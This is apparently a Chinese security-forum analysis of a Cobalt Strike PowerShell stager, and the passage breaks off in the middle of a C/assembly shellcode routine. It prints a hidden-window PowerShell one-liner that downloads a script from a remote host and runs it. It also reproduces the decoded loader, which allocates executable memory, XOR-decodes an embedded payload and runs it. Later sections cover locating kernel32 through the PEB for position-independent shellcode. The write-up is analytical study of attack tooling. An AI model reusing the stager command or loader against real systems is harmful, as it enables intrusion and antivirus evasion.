0x00 本文主要分析内容
=============

1、CS powershell上线过程分析  
2、powershell shellcodeloader分析  
3、shellcode内容  
4、dll注入相关内容  
5、ReflectDllInjection技术分析

0x01 生成攻击payload：
=================

CS通过Arttack—&gt;Web Drive-by—&gt;Scripted Web Delivery（s）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-85088e13045df56884222d1d1936649b2154b492.png)  
生成的攻击payload如下：

`powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.129.132:80/xxx'))"`

0x02 取hxxp://xxx:port/xx文件内容
============================

直接访问对应地址，`http://192.168.129.132:80/xxx`拿到内容：

```php
$s\=New-Object IO.MemoryStream(,\[Convert\]::FromBase64String("H4sIAAAAAAAAAOy9Wc/q..........................................EJEsbCTVgUA"));  
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,\[IO.Compression.CompressionMode\]::Decompress))).ReadToEnd();
```

简化下：

```php
$s\=New-Object IO.MemoryStream(,\[Convert\]::FromBase64String("字符内容"));  
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,\[IO.Compression.CompressionMode\]::Decompress))).ReadToEnd();
```

其实就是执行一个IEX的powershell命令，传入的参数为上面那段字符串的base64解码然后gzig解压缩之后的内容：

0x03 base64 AND Gzip Decode
===========================

所以这里我们直接对上述字符串解码：

简单写个java脚本解下( 当然其实大可不必，直接丢powershell里面就可以解出来重定向到文件里面即可,或者直接一个工具也能比较方便的解出来比如CyberChef，但是这里我习惯用java处理，就几行代码，也很快)：

```php
import sun.misc.BASE64Decoder;  
import java.io.\*;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
import java.util.Base64;  
import java.util.zip.GZIPInputStream;  
import java.util.zip.ZipException;  
​  
/\*\*  
 \* @author ga0weI  
 \* @time 20220731  
 \*/  
​  
public class OtherforCStest {  
    public static void main(String\[\] args) throws Exception {  
        try(  
        FileOutputStream fileOutputStream \= new FileOutputStream("Afterdbase64Dgzip.txt")){  
        Path path \= Paths.get("Waitdbase64Dgzip.txt");  
        byte\[\] bytess\= Files.readAllBytes(path);  
        byte\[\] res \= Base64.getDecoder().decode(bytess);//base64解码  
        byte\[\] bres \= uncompress(res);//gzip解码  
        fileOutputStream.write(bres);  
        System.out.println("解码完成，生成文件Afterdbase64Dgzip.txt");  
        }  
    }  
    /\*\*  
     Gzip解压  
     \*/  
    public static byte\[\] uncompress(byte\[\] bytes) throws ZipException, IOException {  
        if (bytes \== null || bytes.length \== 0) {  
            return null;  
        }  
        ByteArrayOutputStream out \= new ByteArrayOutputStream();  
        ByteArrayInputStream in \= new ByteArrayInputStream(bytes);  
        GZIPInputStream ungzip \= new GZIPInputStream(in);  
        byte\[\] buffer \= new byte\[256\];  
        int n;  
        while ((n \= ungzip.read(buffer)) \>= 0) {  
            out.write(buffer, 0, n);  
        }  
        return out.toByteArray();  
    }  
}  
​
```

解出来之后：

```php
Set-StrictMode \-Version 2  
​  
function func\_get\_proc\_address {  
    Param ($var\_module, $var\_procedure)       
    $var\_unsafe\_native\_methods \= (\[AppDomain\]::CurrentDomain.GetAssemblies() | Where-Object { $\_.GlobalAssemblyCache \-And $\_.Location.Split('\\\\')\[\-1\].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')  
    $var\_gpa \= $var\_unsafe\_native\_methods.GetMethod('GetProcAddress', \[Type\[\]\] @('System.Runtime.InteropServices.HandleRef', 'string'))  
    return $var\_gpa.Invoke($null, @(\[System.Runtime.InteropServices.HandleRef\](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var\_unsafe\_native\_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var\_module)))), $var\_procedure))  
}  
​  
function func\_get\_delegate\_type {  
    Param (  
        \[Parameter(Position \= 0, Mandatory \= $True)\] \[Type\[\]\] $var\_parameters,  
        \[Parameter(Position \= 1)\] \[Type\] $var\_return\_type \= \[Void\]  
    )  
​  
    $var\_type\_builder \= \[AppDomain\]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), \[System.Reflection.Emit.AssemblyBuilderAccess\]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', \[System.MulticastDelegate\])  
    $var\_type\_builder.DefineConstructor('RTSpecialName, HideBySig, Public', \[System.Reflection.CallingConventions\]::Standard, $var\_parameters).SetImplementationFlags('Runtime, Managed')  
    $var\_type\_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var\_return\_type, $var\_parameters).SetImplementationFlags('Runtime, Managed')  
​  
    return $var\_type\_builder.CreateType()  
}  
​  
If (\[IntPtr\]::size \-eq 4) {  
    \[Byte\[\]\]$var\_code \= \[System.Convert\]::FromBase64String('bnlicXZrqsZr............................................jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw==')  
​  
    for ($x \= 0; $x \-lt $var\_code.Count; $x++) {  
        $var\_code\[$x\] \= $var\_code\[$x\] \-bxor 35  
    }  
​  
    $var\_va \= \[System.Runtime.InteropServices.Marshal\]::GetDelegateForFunctionPointer((func\_get\_proc\_address kernel32.dll VirtualAlloc), (func\_get\_delegate\_type @(\[IntPtr\], \[UInt32\], \[UInt32\], \[UInt32\]) (\[IntPtr\])))  
    $var\_buffer \= $var\_va.Invoke(\[IntPtr\]::Zero, $var\_code.Length, 0x3000, 0x40)  
    \[System.Runtime.InteropServices.Marshal\]::Copy($var\_code, 0, $var\_buffer, $var\_code.length)  
​  
    $var\_runme \= \[System.Runtime.InteropServices.Marshal\]::GetDelegateForFunctionPointer($var\_buffer, (func\_get\_delegate\_type @(\[IntPtr\]) (\[Void\])))  
    $var\_runme.Invoke(\[IntPtr\]::Zero)  
}  
​
```

这里面其实就是定了一个两个方法（func\_get\_proc\_address、func\_get\_delegate\_type），然后代码逻辑里面是做了一个if条件判断然后执行一段代码，代码里面调用上面定义的两个方法。

0x04 分析代码逻辑
===========

if的判断条件是`[IntPtr]::size`的值

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-4cf7c11ed7c2e9210b27cc4289d8c80dc9a89905.png)

这个值是用来判断powershell的session是x86还是x64:

如下：x64里面`[IntPtr]::size`为8

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f03b83e877bab807a0845c85d707fddce1cd85c6.png)

x86是里面是`[IntPtr]::size`为4。其实这里就是我们在生成payload的时候我们是否勾选x64:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-242630acafaad01999f462f75e925e411dbb9708.png)

if条件满足后，定义了一个字节数组var\_code，这个的内容是对后面那串base64解码之后的内容。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7183e61127e26e3c934b29e109bfcbedf7964dcd.png)

随后进入一个for循环，for循环里面是对var\_code里面的字节逐个做异或，异或35(异或是模2同余运算，所以加解密的操作一样，这里是解密)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-70ba5681dbcf60ec2a500c88fd0a06d3f338b61c.png)

这里其实是在做还原，只不过因为异或的特殊性，异或就是2进制里面的mod2同余操作，所以这里在生成payload的时候的加密操作也是和35做异或，最后解密也是异或。

这里我们简单写个脚本解密和解密下：还是用java来：

```php
package myutils;  
​  
import java.io.FileOutputStream;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
import java.util.Base64;  
​  
/\*\*  
 \* @author ga0weI  
 \* @time 20220731  
 \*/  
​  
public class Dbase64andDxor {  
    public static void main(String\[\] args) throws  Exception{  
        String filename \= "Waitdbase64Dxor.txt"; //待解密的base64字符串文件  
        fileforDxorFile(filename);  
    }  
    public static void fileforDxorFile(String filepath)throws Exception{  
        Path p \= Paths.get(filepath);  
        byte\[\] filenamebytes \= Files.readAllBytes(p);  
        byte\[\] afterDbase64bytes \= Base64.getDecoder().decode(filenamebytes);//base64解码  
        byte\[\] afterDxorbytes \= new byte\[afterDbase64bytes.length\];  
        int i \=0;  
        for(i\=0;i<afterDbase64bytes.length;i++){  
            afterDxorbytes\[i\]\=(byte)(afterDbase64bytes\[i\]^35);//xor解密  
        }  
        try(FileOutputStream fis \=new FileOutputStream("final"))  
        {  
            fis.write(afterDxorbytes);  
            System.out.println("文件生成：final");  
        }  
     }  
​  
​  
}
```

运行后生成的解密后的final文件：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-bbc58513aa8271e539ed18c8eb00a35488b0c00b.png)

一、分析解密后的final文件，也就是最后var\_code字节数组里面的值
--------------------------------------

拿winhex直接打开，打开后发现这个文件是个pe文件，

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1c564acefc2f11d73da166a5e10599900453b274.png)

接下来我们来回顾下pe文件的文件格式，PE文件最主要的两种形式就是exe和dll文件：

dos头中，我们只要知道头是MZ，3c的位置指向PE头，除此之外，doc头中间部分的值和3C的值到PE头的位置中见的部分的值都是可以随意填充的不影响运行，可以填充为00。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c1d2fc1ee8f734ee243f9eacaf849900b2c62da9.png)  
接下来我们来看PE文件头：

PE文件头一共20字节

```php
typedef struct \_IMAGE\_FILE\_HEADER {
WORD Machine;2 //CPU类型 
WORD NumberOfSections;2 //节数 
DWORD TimeDateStamp;4 //编译器的时间戳 
DWORD PointerToSymbolTable;4 //COFF文件符号表在文件中的偏移 
DWORD NumberOfSymbols;4 //如果有COFF 符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF 符号表的结束位置，则需要这个变量 
WORD SizeOfOptionalHeader;2 //可选pe头的大小 
WORD Characteristics;2 //文件属性相关 
} 
IMAGE\_FILE\_HEADER, \*PIMAGE\_FILE\_HEADER;
```

如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-97031c8bee470dbb826e9740041b1920f56d0009.png)

最后的文件属性，要将两个字节的内容转成2进制，然后匹配下面的数据位：如 上图中对应两字节为A022

转成2进制：1010 0000 0010 0010 —&gt;第15、13、5、1位，所以该文件是一个大尾文件、dll文件、对应的应用程序可以处理大于2gb的地址，文件时可执行的：（这里也可以去参考导入和导出表来判断是dll还是exe）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-17697f1d74ef7781735f2a5aadc8f9c4fac348ec.png)

直接使用Exeinfo先看下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6693ce55eddb62c7f16337218767eb9b9da8bf61.png)

正常dll文件。

到这我有点懵了，放个dll文件放这干啥，

这里我们回过头去看下后续对该dll二进制文件的处理,也就是异或解密后的代码：

二、分析解密code之后的相关执行逻辑：
--------------------

```php
If (\[IntPtr\]::size \-eq 8) {  
    \[Byte\[\]\]$var\_code \= \[System.Convert\]::FromBase64String('bnlicXZrqsZr............................................jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw==')  
​  
    for ($x \= 0; $x \-lt $var\_code.Count; $x++) {  
        $var\_code\[$x\] \= $var\_code\[$x\] \-bxor 35  
    }  
​  
    $var\_va \= \[System.Runtime.InteropServices.Marshal\]::GetDelegateForFunctionPointer((func\_get\_proc\_address kernel32.dll VirtualAlloc), (func\_get\_delegate\_type @(\[IntPtr\], \[UInt32\], \[UInt32\], \[UInt32\]) (\[IntPtr\])))  
    $var\_buffer \= $var\_va.Invoke(\[IntPtr\]::Zero, $var\_code.Length, 0x3000, 0x40)  
    \[System.Runtime.InteropServices.Marshal\]::Copy($var\_code, 0, $var\_buffer, $var\_code.length)  
​  
    $var\_runme \= \[System.Runtime.InteropServices.Marshal\]::GetDelegateForFunctionPointer($var\_buffer, (func\_get\_delegate\_type @(\[IntPtr\]) (\[Void\])))  
    $var\_runme.Invoke(\[IntPtr\]::Zero)  
}
```

解密之后的执行逻辑一共就五句话：

第一句：

`$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))`

这里是调用了Marshal对象的GetDelegateForFunctionPointer方法，传入了两个参数：

参数一：`func_get_proc_address kernel32.dll VirtualAlloc`

参数二：`func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))`

这里其实就是调用了上面在这段代码前定义的两个方法：

第一个方法：func\_get\_proc\_address

其实现如下：

```php
function func\_get\_proc\_address {  
    Param ($var\_module, $var\_procedure)       
    $var\_unsafe\_native\_methods = (\[AppDomain\]::CurrentDomain.GetAssemblies() | Where-Object { $\_.GlobalAssemblyCache -And $\_.Location.Split('\\\\')\[-1\].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')  
    $var\_gpa = $var\_unsafe\_native\_methods.GetMethod('GetProcAddress', \[Type\[\]\] @('System.Runtime.InteropServices.HandleRef', 'string'))  
    return $var\_gpa.Invoke($null, @(\[System.Runtime.InteropServices.HandleRef\](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var\_unsafe\_native\_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var\_module)))), $var\_procedure))  
}
```

如上代码，其实从函数名称里面我们就可以大概看出来这个函数干了啥：应该是获取了某个procedure的地址和winapi kernel32.dll里面的GetProAddress类似，这里我们简单来看下这些代码干了啥：

该函数传入两个参数，一个是module，一个是procedure，然后第一句是从当前系统程序集里面找到System.dll并调用GetType获取其UnsafeNatibeMethods对象：

`$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')`

如下的第二句：通过上面获取的UnsafeNatibeMethods对象调用GetMethod来获取GetProAddress的句柄，其实就是指针，也就是在.net（powershell是基于.net的）中的非托管函数指针。

`$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))`

如下最后一句：最后一句非常长，其实就是一个反射调用，先是和上面同样的方式通过`$var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module))`拿到传入module的句柄，然后这个反射调用就等价于调用了GetProcAddress（hMoudle，lpProcName），hMoudle是传入的参数module，lpProcName是传入的参数lpProcName。

```php
return $var\_gpa.Invoke($null, @(\[System.Runtime.InteropServices.HandleRef\](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var\_unsafe\_native\_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var\_module)))), $var\_procedure))
```

所以总结下：这个func\_get\_proc\_address函数的功能就是获取传入dll里面对应传入函数名的地址。和win api里面Kernel32.dll里面GetProcAddress一样，按笔者的理解，其实这里就是c#中如何去实现调用GetProcAddress，只不过这里是通过System.dll这条路过去的，应该还有其他办法，这种可能是一种免杀的手段（包括这里通过反射调用啥的）。

第二个方法：func\_get\_delegate\_type

```php
​  
function func\_get\_delegate\_type {  
    Param (  
        \[Parameter(Position = 0, Mandatory = $True)\] \[Type\[\]\] $var\_parameters,  
        \[Parameter(Position = 1)\] \[Type\] $var\_return\_type = \[Void\]  
    )  
​  
    $var\_type\_builder = \[AppDomain\]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), \[System.Reflection.Emit.AssemblyBuilderAccess\]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', \[System.MulticastDelegate\])  
    $var\_type\_builder.DefineConstructor('RTSpecialName, HideBySig, Public', \[System.Reflection.CallingConventions\]::Standard, $var\_parameters).SetImplementationFlags('Runtime, Managed')  
    $var\_type\_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var\_return\_type, $var\_parameters).SetImplementationFlags('Runtime, Managed')  
​  
    return $var\_type\_builder.CreateType()  
}
```

这两个方法都看完了，我们回到上面的五句逻辑代码：

```php
    $var\_va = \[System.Runtime.InteropServices.Marshal\]::GetDelegateForFunctionPointer((func\_get\_proc\_address kernel32.dll VirtualAlloc), (func\_get\_delegate\_type @(\[IntPtr\], \[UInt32\], \[UInt32\], \[UInt32\]) (\[IntPtr\])))  
    $var\_buffer = $var\_va.Invoke(\[IntPtr\]::Zero, $var\_code.Length, 0x3000, 0x40)  
    \[System.Runtime.InteropServices.Marshal\]::Copy($var\_code, 0, $var\_buffer, $var\_code.length)  
​  
    $var\_runme = \[System.Runtime.InteropServices.Marshal\]::GetDelegateForFunctionPointer($var\_buffer, (func\_get\_delegate\_type @(\[IntPtr\]) (\[Void\])))  
    $var\_runme.Invoke(\[IntPtr\]::Zero)
```

第一句这里其实就是调用System.Runtime.InteropServices.Marshal对象的GetDelegateForFunctionPointer方法，传入VirtualAlloc的函数地址以及一个我们构造的委派类型，我们来看下这个方法是干啥的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-04dfa40a7c160671dd04d852228fd4520f98d2bf.png)

所以第一句就是将我们传入的VirtuaAlloc非托管函数指针转换成我们第二个参数中构造的委托类型的委托。为什么要这么做呢？

因为windows 的api在不是基于.net的，这里称不是基于.net的api，也就是第三方的api，称为非托管函数；所以我们在powershell中要调用VirtualAlloc这个win api的时候，我们不能直接通过非托管函数调用，那么怎么调用呢，调用的方法之一就是这里的通过GetDelegateForFunctionPointer方法将非托管函数指针转换成委托实例来调用。

如下的第二句话就是通过反射调用第一句中的委托：就相当于调用VirtualAlloc这个api，开辟了一个上面var\_code大小的空间。返回该地址的基址给var\_buffer

$var\_buffer = $var\_va.Invoke(\[IntPtr\]::Zero, $var\_code.Length, 0x3000, 0x40)

如下的第三句话：调用System.Runtime.InteropServices.Marshal的Copy方法，将var\_code字节数组里面的值复制到刚刚开辟出来的var\_buffer空间中。

`[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)`

至此，我们的dll文件就写到了该进程的运行内存中：

如下是第四句话：就是调用GetDelegateForFunctionPointer方法将开辟出来空间的非托管函数指针转化成实例，为下面调用做准备

`$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))`

如下是第五句话：反射直接在该进程中运行第四句获取的委托，其实就是运行那个字节码，也就是我们看上去像是dll的字节码（其实也是字节码）

`$var_runme.Invoke([IntPtr]::Zero)`

简单回看下上面的5句话，会发现这里的5句话其实就是一个shellcodeloader，那么var\_code里是我们想要执行的shellcode。那为啥这里我们解密出来的var\_code也就是所谓的“shellcode”是个dll呢？

这里我们就要思考下普通shellcode在这里是怎么工作的了，在笔者看来shellcode本身其实就是一串没有“依赖”的机器码，我们可以将其注入到任意的EXE文件里面，通过hook的方式也好，直接注入，（如修改入口点先执行shellcode再跳回ep）也好，其都能够执行，不依赖宿主导入表和重定向表等。

所以接下来分析的思路有两条：

1、直接将dll当作shellcode作为机器码转为汇编来分析

2、了解下关于shellcode和dll之间联系的技术

笔者在分析这里的时候其实是走了一个很长的弯路，第二条路，并且然后跑偏了去学习shellcode编写和相关dll注入技术了。不过巧合的是，通过这两点技术的学习，使笔者之后对分析上面这个dll更加得心应手（包括对后期的msf和csshellcode的分析也更加清晰）。当然不置可否，如果只是从解决问题的角度肯定走第一条路更好。

**这里笔者从第二条思路展开写下自己的一个学习过程，因为第一条思路其实是比较无聊的，就是硬肯汇编代码，并且没有思路，不好理解。**

0x05 shellcode的编写
=================

shellcode就是一串放到哪都能执行的机器码，不依赖导入表和重定向表，也就是不依赖环境，那么这个是怎么做到的呢?

我们如何在不直接使用 win32的api的情况下来调用相关api接口的呢？（一般我们直接调用api，其实都是一个间接call，从导出表里面IAT表里面拿api的函数的真实地址。但是因为这个真实地址会随着模块在每个进程中被加载的基址不同而改变，所以我们在shellcode中不能直接调用api）

如下是直接调用api的过程分析：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-19f90321f8a1746b505eb4c87aec0415f3bf188b.png)

打个调试断点：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-aa0f9bef022b99b6cbe6177ad9c2c50a72e02141.png)

查看反汇编代码：如下图，push 进去我们传入的四个参数之后，直接一个间接call，传入的地址`089B098h`。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-08a6e7a02d7b8d55890f2b568138b09ffbce53ef.png)

`089B098h`其实就是messageBoxA这个api在IAT中对应的地址:

这里我们通过将该exe丢到od中来看下：

通过简单的自动步过，三步直接就可以定位到程序里面的弹窗代码位置，或者直接根据上面我们的反汇编可以看到，地址是0089183E，去到对应位置：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-37dbfe307e2d5f707a410a976c88e18ab87a0acf.png)

然后在数据窗口中ctrl+g，输入0089B098，来到该api的IAT的位置，可以看到这里存着75B3A380，这个地址就是MessageBoxA在进程中的真实地址

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-839b408844b2d141e28e4789c35a794b430514a5.png)

我们这里从dll里面看下MessageBoxA对应的地址是否为：75B3A380，如下操作，点击E，然后找到user32.dll（因为MessageBoxA是在该模块里面的），右键View names，

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-4556f7b9dc86f1862f483e25807dd2b03d12354d.png)

如下图：MessageBoxA的地址是75B3A380，和上面的一致。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7cdbe23be094164a12fd4b4701bc04865aeafe41.png)

所以我们会发现直接调用api的整过程，其实就是依赖exe里面的导入表，通过里面的IAT表找到要用api的真实地址。而每个被加载进exe中的IAT表其值是不一样的，如果在shellcode中使用去固定位置找IAT表里面的值是肯定不行的，即使是相同api其IAT所指向的地址可能也是不一样，因为这个是要看对应模块也就是dll的基址分配到哪里了（当然也有特殊情况，比如在windows中模块的加载顺序总是先加载自己exe本身，然后加载ntdll.dll模块然后加载kernel32.dll模块，基本绝大多数的程序都是这样的，所以对于常见系统dll可能会加载到固定位置），那我们在将shellcode注入到任意exe对应的进程中去，都能保证其能正常运行是怎么做的呢？

**所以写shellcode其实就解决一件事，怎么不依赖导入表中的IAT表来拿到api函数的真实地址（内存中的地址）**

这里我们可以把问题再简化下，其实就是在不依赖带入表的时候拿到GetProAddressA和LoadLibraryA两个api的值，因为只要我们拿到了这两个api的真实地址，我们就可以通过以下方式找到任意api的真实地址：

`GetProAddressA(LoadLibraryA( module_name),api_name)`

这里一个很重要的点是，导入表里面的IAT表（存有相关调用函数api的真实地址），这个表是从哪来的？

在PE文件结构中，导入表中有两个比较重要的结构表，一个是IAT（导入地址表），一个是INT（导入名称表）。这个两个表是相辅相成的（像我们经常提到的导入表修复，其实就是根据其中一个表还原另一个表）。在PE文件没有被加载的时候，INT和IAT其实就是一模一样的，当被加载到内存中去的时候，IAT就发生了变化，变成指向对应函数api的真实地址了。

那这个变化过程是怎么实现的呢? 这个过程简单说就是通过INT获取api的名称或序号，通过导出表里面的dllname字段获取dll名称，然后找到对应dll的基址，然后找到对应dll的导出表，然后根据名称以及序号拿到对应api的真实地址，写到导入表里IAT表里面。

**所以这里的比较关键的一步就是去获取加载到进程中的dll的基址。**

而在Windows用户态编程中，我们可以通过fs这个寄存器来完成获取进程中加载的dll的基址：

**接下来就是通过fs这个寄存器来得到GetProAddressA和LoadLibraryA两个api的函数地址：**

在Windwos的用户态下fs寄存器的地址就是当前线程的环境块（TEB）,在其0x30的偏移处（即FS：\[0x30\]）存放的是当前进程的PEB地址：

如下是TEB的结构，0x30偏移指向PEB

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0ef7fdc8487d2f274d1ecbfa018ea6519d5a9f52.png)

拿到PEB之后，如下是PEB的结构：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ad9e9fb7126dbf39cacf9762191f222eed0bdae6.png)

如下图：这里面我们注意这个ldr结构，ldr的地址是PEB：\[0x0c\]：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-88d9acd822319fa6061d0a780da2bdc9f4c180f6.png)

如下微软给的对ldr的解释：是一个指向PEB\_LDR\_DATA的结构体的指针，PEB\_LDR\_DATA这个结构体里面记录了一些在进程中加载的模块的信息，这个信息的结构体是如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-742f94f0707bc04189df4cfe56477859e8322b86.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f29b29683b0b98120746b686991fc5a0211e6fa4.png)

这里我们取中间的那个链表 InMemortOrderModuleList这个链表，该链表的地址是LDR：\[0x14\]。

所以按内存中加载顺序来排，这里LDR：\[0x14\]其实就是第一个模块对应的结构体，结构体为\_LDR\_DATA\_TABLE\_ENTRY，如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7159506417fececfc69bac1900830f9362076718.png)

上图中我们要注意一个非常关键的点，这里的InMemoryOrderLinks这个链表指向的并不是基址，而是0x08的偏移位置，也就是说指针双向链表指针指向的是结构体的一个0x08偏移的位置，而不是基址。

所以当我们想获取到上面\_LDR\_DATA\_TABLE\_ENTRY结构体里面的DllBase的时候，虽然其相对基址的偏移是0x18，但是我们获取的时候是通过链表指针获取过来的，所以算的是相对InMemoryOrderLinks(这个的偏移是0x08)的偏移，所以DllBase这里我们就可以表示为：InMemoryOrderLinks\[0x10\]；

**通过这一系列操作我们拿到了内存中第一个加载模块的基址：其表达式为`(((fs:[30]):[0x0c]):[0x14]):[0x10]`**

这里上文曾也提到，内存中加载模块的顺序其实前面的系统模块是固定的顺序，一般来说，先加载exe自己本身到内存，然后加载ntdll.dll到内存，然后加载kernel32到内存中。而我们要找的两个api，GetProAddress和LoadLibrary这两个api其实都在kernel32.dll里面，所以我们的目的其实是获取到kernel32.dll的基址然后通过dll的导出表，去遍历导出表，来找两个api方法。

kernel32是第三个加载的模块，所以我们找到第三个记载的模块的基址：,其实这里第一个模块和第三个模块就是多便利两次的问题，并我们还不需要偏移，因为这个双向链表里面头指向的是下一个链表头，所以只要取两次地址然后再取0x10偏移就好了：`[[((fs:[30]):[0x0c]):[0x14]]]:[0x10]`

这样我们就拿到了想要的kernel32.dll的基址。

如下是一个简单shellcode的代码实现：

```php
#include<iostream>  
#include<windows.h>  
​  
\_\_declspec(naked) DWORD getKernel32()  
{  
    \_\_asm  
    {  
        mov eax, fs: \[0x30\]   //fs:\[30\] 纯存的是PEB，也就是进程环境块，操作系统在加载进程的过程中会自动初始化一个PEB结构体用来初始化该进程的各种信息的结构体  
        mov eax, \[eax + 0x0c\]    //也就是PEB 0ch处的偏移，该结构体的三个成员链表都可以获取kernel32的基址  
        mov eax, \[eax + 0x14\]    //获取初始化顺序链表的地址,首地址是第一个模块  
        mov eax, \[eax\]        //第二个模块  
        mov eax, \[eax\]        //第三个模块  
        mov eax, \[eax + 0x10\]    // 18h偏移处就是kernel32的基地址,这里我们0x10是相对InMemoryOrderLinks偏移  
        ret  
    }  
}  
​  
FARPROC \_GetProcAddress(HMODULE hModuleBase)  
{  
    //DOS头  
    PIMAGE\_DOS\_HEADER lpDosHeader \= (PIMAGE\_DOS\_HEADER)hModuleBase;  
    //PE头  
    PIMAGE\_NT\_HEADERS32 lpNtHeader \= (PIMAGE\_NT\_HEADERS)((DWORD)hModuleBase + lpDosHeader\->e\_lfanew);  
    //判断导出表size不为0  
    if (!lpNtHeader\->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_EXPORT\].Size) {  
        return NULL;  
    }  
    //确认导出表RVA不为0  
    if (!lpNtHeader\->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_EXPORT\].VirtualAddress) {  
        return NULL;  
    }  
    //导出表的真实地址 = RVA + kernel32基址  
    PIMAGE\_EXPORT\_DIRECTORY lpExports \= (PIMAGE\_EXPORT\_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeader\->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_EXPORT\].VirtualAddress);  
    //导出函数名地址表真实地址 = RVA  + kernel32基址  
    PDWORD lpdwFunName \= (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports\->AddressOfNames);  
    //导出函数名序号表真实地址 = RVA + kernel32基址  
    PWORD lpword \= (PWORD)((DWORD)hModuleBase + (DWORD)lpExports\->AddressOfNameOrdinals);  
    //导出函数地址表真实地址 =RVA +kernel32基址  
    PDWORD lpdwFunAddr \= (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports\->AddressOfFunctions);  
​  
​  
    DWORD dwLoop \= 0;  
    FARPROC pRet \= NULL;  
    //循环遍历导出函数，找到要用的api的真实函数地址  
    for (; dwLoop <= lpExports\->NumberOfNames \- 1; dwLoop++) {  
        char\* pFunName \= (char\*)(lpdwFunName\[dwLoop\] + (DWORD)hModuleBase);  
​  
        if (pFunName\[0\] \== 'G' && pFunName\[1\] \== 'e' && pFunName\[2\] \== 't' && pFunName\[3\] \== 'P' && pFunName\[4\] \== 'r' &&  
